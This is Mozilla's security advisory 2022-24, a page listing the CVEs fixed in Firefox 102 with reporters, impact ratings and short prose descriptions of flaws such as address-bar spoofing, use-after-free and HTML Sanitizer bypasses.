    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2022-24

## Security Vulnerabilities fixed in Firefox 102

Announced
June 28, 2022
Impact
high
Products
Firefox
Fixed in

* Firefox 102

*Note*: While [Bug 1771084](https://bugzilla.mozilla.org/show_bug.cgi?id=1771084) does not represent a specific vulnerability that was fixed, we recommend anyone rebasing patches to include it. 102 branch: Patch [1](https://hg.mozilla.org/releases/mozilla-beta/rev/82e3067ad2e7) and [2](https://hg.mozilla.org/releases/mozilla-beta/rev/6e4639dc3614). 91 Branch: Patch [1](https://hg.mozilla.org/releases/mozilla-esr91/rev/72bca7a337e4) and [2](https://hg.mozilla.org/releases/mozilla-esr91/rev/befef01949f2) (Despite saying Parts 2 and 3, there is no Part 1)

#### [#CVE-2022-34479: A popup window could be resized in a way to overlay the address bar with web content](#CVE-2022-34479)

Reporter
Irvan Kurniawan
Impact
high
##### Description

A malicious website that could create a popup could have resized the popup to overlay the address bar with its own content, resulting in potential user confusion or spoofing attacks.
*This bug only affects Firefox for Linux. Other operating systems are unaffected.*

##### References

* [Bug 1745595](https://bugzilla.mozilla.org/show_bug.cgi?id=1745595)

#### [#CVE-2022-34470: Use-after-free in nsSHistory](#CVE-2022-34470)

Reporter
Armin Ebert
Impact
high
##### Description

Session history navigations may have led to a use-after-free and potentially exploitable crash.

##### References

* [Bug 1765951](https://bugzilla.mozilla.org/show_bug.cgi?id=1765951)

#### [#CVE-2022-34468: CSP sandbox header without "allow-scripts" can be bypassed via retargeted javascript: URI](#CVE-2022-34468)

Reporter
Armin Ebert
Impact
high
##### Description

An iframe that was not permitted to run scripts could do so if the user clicked on a `javascript:` link.

##### References

* [Bug 1768537](https://bugzilla.mozilla.org/show_bug.cgi?id=1768537)

#### [#CVE-2022-34482: Drag and drop of malicious image could have led to malicious executable and potential code execution](#CVE-2022-34482)

Reporter
Attila Suszter
Impact
moderate
##### Description

An attacker who could have convinced a user to drag and drop an image to a filesystem could have manipulated the resulting filename to contain an executable extension, and by extension potentially tricked the user into executing malicious code. While very similar, this is a separate issue from CVE-2022-34483.

##### References

* [Bug 845880](https://bugzilla.mozilla.org/show_bug.cgi?id=845880)

#### [#CVE-2022-34483: Drag and drop of malicious image could have led to malicious executable and potential code execution](#CVE-2022-34483)

Reporter
Eduardo Braun Prado
Impact
moderate
##### Description

An attacker who could have convinced a user to drag and drop an image to a filesystem could have manipulated the resulting filename to contain an executable extension, and by extension potentially tricked the user into executing malicious code. While very similar, this is a separate issue from CVE-2022-34482.

##### References

* [Bug 1335845](https://bugzilla.mozilla.org/show_bug.cgi?id=1335845)

#### [#CVE-2022-34476: ASN.1 parser could have been tricked into accepting malformed ASN.1](#CVE-2022-34476)

Reporter
Gustavo Grieco
Impact
moderate
##### Description

ASN.1 parsing of an indefinite SEQUENCE inside an indefinite GROUP could have resulted in the parser accepting malformed ASN.1.

##### References

* [Bug 1387919](https://bugzilla.mozilla.org/show_bug.cgi?id=1387919)

#### [#CVE-2022-34481: Potential integer overflow in ReplaceElementsAt](#CVE-2022-34481)

Reporter
Ronald Crane
Impact
moderate
##### Description

In the `nsTArray_Impl::ReplaceElementsAt()` function, an integer overflow could have occurred when the number of elements to replace was too large for the container.

##### References

* [Bug 1497246](https://bugzilla.mozilla.org/show_bug.cgi?id=1497246)
* [Bug 1483699](https://bugzilla.mozilla.org/show_bug.cgi?id=1483699)

#### [#CVE-2022-34474: Sandboxed iframes could redirect to external schemes](#CVE-2022-34474)

Reporter
Amazon Malvertising Team
Impact
moderate
##### Description

Even when an iframe was sandboxed with `allow-top-navigation-by-user-activation`, if it received a redirect header to an external protocol the browser would process the redirect and prompt the user as appropriate.

##### References

* [Bug 1677138](https://bugzilla.mozilla.org/show_bug.cgi?id=1677138)

#### [#CVE-2022-34469: TLS certificate errors on HSTS-protected domains could be bypassed by the user on Firefox for Android](#CVE-2022-34469)

Reporter
Peter Gerber
Impact
moderate
##### Description

When a TLS Certificate error occurs on a domain protected by the HSTS header, the browser should not allow the user to bypass the certificate error. On Firefox for Android, the user was presented with the option to bypass the error; this could only have been done by the user explicitly.
*This bug only affects Firefox for Android. Other operating systems are unaffected.*

##### References

* [Bug 1721220](https://bugzilla.mozilla.org/show_bug.cgi?id=1721220)

#### [#CVE-2022-34471: Compromised server could trick a browser into an addon downgrade](#CVE-2022-34471)

Reporter
Rob Wu
Impact
moderate
##### Description

When downloading an update for an addon, the downloaded addon update's version was not verified to match the version selected from the manifest. If the manifest had been tampered with on the server, an attacker could trick the browser into downgrading the addon to a prior version.

##### References

* [Bug 1766047](https://bugzilla.mozilla.org/show_bug.cgi?id=1766047)

#### [#CVE-2022-34472: Unavailable PAC file resulted in OCSP requests being blocked](#CVE-2022-34472)

Reporter
Laurent Bigonville
Impact
moderate
##### Description

If there was a PAC URL set and the server that hosts the PAC was not reachable, OCSP requests would have been blocked, resulting in incorrect error pages being shown.

##### References

* [Bug 1770123](https://bugzilla.mozilla.org/show_bug.cgi?id=1770123)

#### [#CVE-2022-34478: Microsoft protocols can be attacked if a user accepts a prompt](#CVE-2022-34478)

Reporter
Gijs
Impact
moderate
##### Description

The `ms-msdt`, `search`, and `search-ms` protocols deliver content to Microsoft applications, bypassing the browser, when a user accepts a prompt. These applications have had known vulnerabilities, exploited in the wild (although we know of none exploited through Firefox), so in this release Firefox has blocked these protocols from prompting the user to open them.
*This bug only affects Firefox on Windows. Other operating systems are unaffected.*

##### References

* [Bug 1773717](https://bugzilla.mozilla.org/show_bug.cgi?id=1773717)

#### [#CVE-2022-2200: Undesired attributes could be set as part of prototype pollution](#CVE-2022-2200)

Reporter
Manfred Paul via Trend Micro's Zero Day Initiative
Impact
moderate
##### Description

If an object prototype was corrupted by an attacker, they would have been able to set undesired attributes on a JavaScript object, leading to privileged code execution.

##### References

* [Bug 1771381](https://bugzilla.mozilla.org/show_bug.cgi?id=1771381)

#### [#CVE-2022-34480: Free of uninitialized pointer in lg\_init](#CVE-2022-34480)

Reporter
Ronald Crane
Impact
low
##### Description

Within the `lg_init()` function, if several allocations succeed but then one fails, an uninitialized pointer would have been freed despite never being allocated.

##### References

* [Bug 1454072](https://bugzilla.mozilla.org/show_bug.cgi?id=1454072)

#### [#CVE-2022-34477: MediaError message property leaked information on cross-origin same-site pages](#CVE-2022-34477)

Reporter
jannis
Impact
low
##### Description

The MediaError message property should be consistent to avoid leaking information about cross-origin resources; however for a same-site cross-origin resource, the message could have leaked information enabling XS-Leaks attacks.

##### References

* [Bug 1731614](https://bugzilla.mozilla.org/show_bug.cgi?id=1731614)

#### [#CVE-2022-34475: HTML Sanitizer could have been bypassed via same-origin script via use tags](#CVE-2022-34475)

Reporter
Gareth Heyes
Impact
low
##### Description

SVG `<use>` tags that referenced a same-origin document could have resulted in script execution if attacker input was sanitized via the HTML Sanitizer API. This would have required the attacker to reference a same-origin JavaScript file containing the script to be executed.

##### References

* [Bug 1757210](https://bugzilla.mozilla.org/show_bug.cgi?id=1757210)

#### [#CVE-2022-34473: HTML Sanitizer could have been bypassed via use tags](#CVE-2022-34473)

Reporter
Armin Ebert
Impact
low
##### Description

The HTML Sanitizer should have sanitized the `href` attribute of SVG `<use>` tags; however it incorrectly did not sanitize `xlink:href` attributes.

##### References

* [Bug 1770888](https://bugzilla.mozilla.org/show_bug.cgi?id=1770888)

#### [#CVE-2022-34484: Memory safety bugs fixed in Firefox 102 and Firefox ESR 91.11](#CVE-2022-34484)

Reporter
Mozilla developers and community
Impact
high
##### Description

The Mozilla Fuzzing Team reported potential vulnerabilities present in Firefox 101 and Firefox ESR 91.10. Some of these bugs showed evidence of JavaScript prototype or memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 102 and Firefox ESR 91.11](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1763634%2C1772651)

#### [#CVE-2022-34485: Memory safety bugs fixed in Firefox 102](#CVE-2022-34485)

Reporter
Mozilla developers and community
Impact
moderate
##### Description

Mozilla developers Bryce Seager van Dyk and the Mozilla Fuzzing Team reported potential vulnerabilities present in Firefox 101. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 102](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1768409%2C1768578)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)


